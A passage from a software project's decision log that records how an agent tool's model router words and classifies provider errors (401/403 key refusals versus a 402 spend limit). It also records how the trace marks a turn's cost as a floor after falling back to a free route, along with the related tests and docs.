  - A status counts as a refusal only as `HTTP 401`, `HTTP 403` or an SDK's `Error code: 401`, and "authentication" only as an authentication error or failure. So `HTTP 404: model gpt-403 not found` and a proxy's `HTTP 407: Proxy Authentication Required` read as neither. A spend limit (D-093) reads as neither too, so the line never points at the key for it.
  - Each kind keeps its own count of two a session, as this decision said: `Guide.pick` counts by a tip's `rule` (`providers:auth`, `providers:transport`, `providers:error`), where it used to count all three as `providers`. Two transport or general lines no longer use up a refusal's.
  - The transport line fills `/trace` when Tab is pressed, since it names it.
  - Tests in `plugins/exo-command/tests/test_complete_web.py`:
    - `test_js_router_failures_get_the_line_their_cause_calls_for` runs a real Loop and Router (httpx `MockTransport`) for a `ReadError`, a `ReadTimeout`, a `ConnectError`, a 401 with a key, a 401 without one, no key, a 402 and a 503. It feeds the recorded `model.call` bodies to the page's guide.
    - Three more node tests cover the CLI and status strings, the per-kind counts and the fill.
  - `test_model_command_web.py::test_a_failed_calls_line_reads_the_attempts_chat_hands_over` pins the `chat.js` wiring in the real page.
  - Results: all six fail on main. With only `chat.js` reverted, the browser test fails.

## D-093 (2026-10-30) A spend limit names itself, and the money figure says it is a floor
- **Status:** Accepted. Records after D-092 (#846) and lands on its own branch, `fix/spend-limit-transparency`.
- **Problem:** HTTP 402 (`key_spend_limit_reached`) sat in the same set as 401 and 403, so the turn ended with "anthropic rejected the key (HTTP 402: ...): fix ANTHROPIC_API_KEY or add a key in /providers". A new key fixes nothing there, and the router falls back to a free route, so the turn's cost read `$0.0000` while the paid route had already done work nobody would bill.
- **Decision:** 402 has its own sentence and its own outcome.
  - The error reads `{provider} is over its provider spend limit ({err}): raise the limit or top up the account, then test it in /providers`. It never points at the key field. Still terminal and non-retryable, still benched for the provider's reset (or the long cooldown).
  - The fallback notice says it once: `{route} is over its provider spend limit; trying {next} (this turn's cost is a floor)`.
  - The attempt outcome is `spend_limit`, so the cause survives the fallback and reaches the trace. `ModelCall` documents it.
  - `trace` keeps the billed figure for that call and marks it with the existing `+`. `TurnTrace.undercounted()` counts calls where a route in the call stopped on its spend limit; `summary()` adds them to the `+` count and reports `undercounted_calls` separately, so `unpriced_calls` keeps meaning "no price known".
- **Rejected:** leaving 402 in the key-refusal set (wrong advice), a second money format for floors, and treating an unpriced fallback as free.
- **Why not stop the turn:** a free route may still serve the turn; the principal pays for the warning, not a dead session.
- **Docs:** `docs/PROVIDERS.md` "When every route fails", `docs/TRACE.md` "Cost", `docs/DOCS-MAP.md`, `CHANGELOG.md`. Tests: `tests/core/models/test_router_refusals.py`, `tests/trace/test_trace.py`.
